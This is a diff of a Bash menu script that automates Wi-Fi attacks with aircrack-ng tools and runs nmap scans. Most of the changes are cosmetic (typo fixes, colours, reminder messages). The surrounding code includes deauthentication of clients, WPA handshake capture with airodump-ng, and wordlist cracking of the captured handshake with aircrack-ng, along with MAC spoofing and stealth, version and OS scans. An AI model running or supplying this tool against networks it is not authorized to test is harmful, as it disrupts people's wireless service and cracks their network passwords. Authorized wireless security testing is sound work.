@@ -4,11 +4,11 @@
 #Last Modified: 10/06/2020
 clear
 PS3="NIC#?:"
-echo -e "Checking for requirments!\n"
+echo -e "Checking for requirments...!\n"
 for app in aircrack-ng macchanger xterm; do
 command -v $app 2>&1> /dev/null
 if [[ $? = 0 ]]; then
-echo -e "great! $app installed\n"
+echo -e "\e[92mgreat!\e[00m $app installed\n"
 else echo "$app not installed, script will not function correctly!"
 fi
 done
@@ -28,6 +28,7 @@ kill $!
 exec xterm -hold -e sudo airodump-ng -c $CH $wlan0 &
 PID=$!
 echo -e "Input info from the new terminal that executed:"
+echo -e "Use spacebar to pause then copy info"
 read -p "BSSID:? " BSSID
 read -p "ESSID:? " ESSID
 read -p "STATION:? " STATION
@@ -49,7 +50,7 @@ ADAPTER=$NETWORK
 read -p "Is this the correct adapter $ADAPTER! (y/n/q=quit):" CHOICE
 case $CHOICE in
 y|Y) single;break;;
-n|N) echo "re-running slection!";sleep 1;;
+n|N) echo "re-running selection!";sleep 1;;
 q|Q) break;;
 *) echo "invalid input"
 esac
@@ -76,6 +77,7 @@ kill $!
 exec xterm -hold -e sudo airodump-ng -c $CH $wlan0 &
 PID=$!
 echo -e "Input info from the new terminal that executed:"
+echo -e "Use spacebar to pause and copy info"
 read -p "BSSID:? " BSSID
 read -p "Deauth Count:? " COUNT
 kill $PID
@@ -179,7 +181,7 @@ read -p "Xterm will exit after you select a channel: " CH
 kill $!
 clear
 echo -e "Gather info about the AP on channel $CH"
-echo -e "Close xterm to copy info, xterm will not close!"
+echo -e "Close/spacebar xterm to copy info, xterm will not close!"
 echo -e "Xterm will close after Handshake Name has been inputted"
 read -p "press ENTER"
 exec xterm -hold -e airodump-ng -c $CH $wlan0 &
@@ -191,10 +193,11 @@ read -p "Handshake Name: " HAND
 kill $PID
 echo -e "One last Xterm session will start.." 
 echo -e "This session is to monitor the Handshake on $BSSID." 
-echo -e "*This* terminal will deauthenticate $STATION"
+echo -e "*This* terminal will deauthenticate $STATION -"
 echo -e "to capture the EAPOL packets."
-echo -e "Don't close any window," 
-echo -e "the Xterm session will close automatically."
+echo -e "You will need the $HAND.cap and $HAND.kismet.csv files for cracking"
+echo -e "Don't close any window, Xterm session will close automatically." 
+echo 
 read -p "Press Enter"
 exec xterm -hold -e sudo airodump-ng -c $CH --bssid $BSSID -w $HOME/handshake/$HAND $wlan0 &
 PID=$!
@@ -205,7 +208,8 @@ kill $PID
 sudo airmon-ng stop $wlan0
 sudo ip link set $ADAPTER down && sudo ip link set $ADAPTER up
 echo
-read -p "Great! Handshake Captured: Press Enter.."
+echo -e "\e[92mGreat!\e[00m Handshake Captured: Press Enter.."
+read -p "Remember you will need the $HAND.cap and $HAND.kismet.csv files for cracking!"
 rm -i $HOME/handshake/$HAND*
 else
 echo -e "\e[91mOnly root/sudo can run this Fuction!\e[00m"
@@ -226,6 +230,7 @@ exec xterm -hold -e aircrack-ng -e $ESSID -b $BSSID -w $WORD $PACKET &
 if [[ -d /root/handshake ]];then
 cd /root/handshake
 ls
+echo
 crack
 elif [[ ${UID} -ne 0 ]]; then
 HOME=$HOME
@@ -234,6 +239,7 @@ echo -e "Path of Captured Handshake:?"
 read DIRECTORY
 cd $DIRECTORY
 ls
+echo
 crack
 else echo "root user has no Handshake Captures"
 sleep 3
@@ -292,7 +298,7 @@ read -p "PRESS ENTER"
 nmap $HOST;;
 
 3)echo -e "Stealth_Scan"
-Sscan () {
+    Sscan () {
 read -p "What is the IP of the host to Stealth_Scan?:" SHOST
 echo "nmap will perform: nmap -sS $SHOST"
 read -p "PRESS ENTER"
@@ -312,7 +318,7 @@ read -p "PRESS ENTER"
 nmap -sV $VHOST;;
 
 5)echo -e "OS_Scanning"
-OSscan () {
+    OSscan () {
 read -p "What is the IP of the host to OS_Scan?:" OSHOST
 echo "nmap will perform: nmap -O $OSHOST"
 read -p "PRESS ENTER"
@@ -359,16 +365,16 @@ clear
 ########################################################################################################################################
 while true; do
 if [ ${UID} != 0 ]; then
-echo -e "Running script as [\e[92m$USER!\e[00m]"
+echo -e "\t\tRunning script as [\e[92m$USER!\e[00m]"
 elif [ ${UID} = 0 ]; then
-echo -e "Running script as [\e[91m$USER!\e[00m]"
+echo -e "\t\tRunning script as [\e[91m$USER!\e[00m]"
 fi
 echo "*Please run Port_Scan in fullscreen, to get best visual results*"
-echo -e "##########################################################"
-echo -e "#   1.Deauth_Single   4.Ping_Network       7.Port_Scan   #"
-echo -e "#   2.Deauth_ALL      5.Capture_Handshake  8.SFTP        #"
-echo -e "#   3.Change_MAC      6.Crack_Handsake     9.EXIT        #"
-echo -e "##########################################################"
+echo -e "  ###########################################################"
+echo -e "  #   1.Deauth_Single   4.Ping_Network       7.Port_Scan    #"
+echo -e "  #   2.Deauth_ALL      5.Capture_Handshake  8.SFTP         #"
+echo -e "  #   3.Change_MAC      6.Crack_Handsake     9.EXIT         #"
+echo -e "  ###########################################################"
 read -p "#? "
 clear
 case $REPLY in
